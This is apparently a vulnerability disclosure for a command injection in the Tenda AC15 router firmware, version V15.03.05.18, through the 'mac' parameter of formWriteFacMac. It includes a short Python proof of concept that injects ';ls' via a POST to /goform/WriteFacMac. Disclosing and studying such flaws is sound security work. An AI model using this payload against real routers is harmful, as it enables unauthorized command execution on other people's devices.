## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2710.html

## Affected version

AC15 V15.03.05.18

## Vulnerability details

The Tenda AC15 V15.03.05.18 firmware, we discovered a command injection vulnerablility in `formWriteFacMac` function in the `mac` parameter and the `v3` varable is directly passed to a `doSystemCmd` function, causing an arbitrary command execution. The user-provided `mac` can trigger this security vulnerability.

![image-20240314223205430](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314223205430.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/WriteFacMac"
payload = ";ls"

data = {"mac": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240314212024903](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314212024903.png)
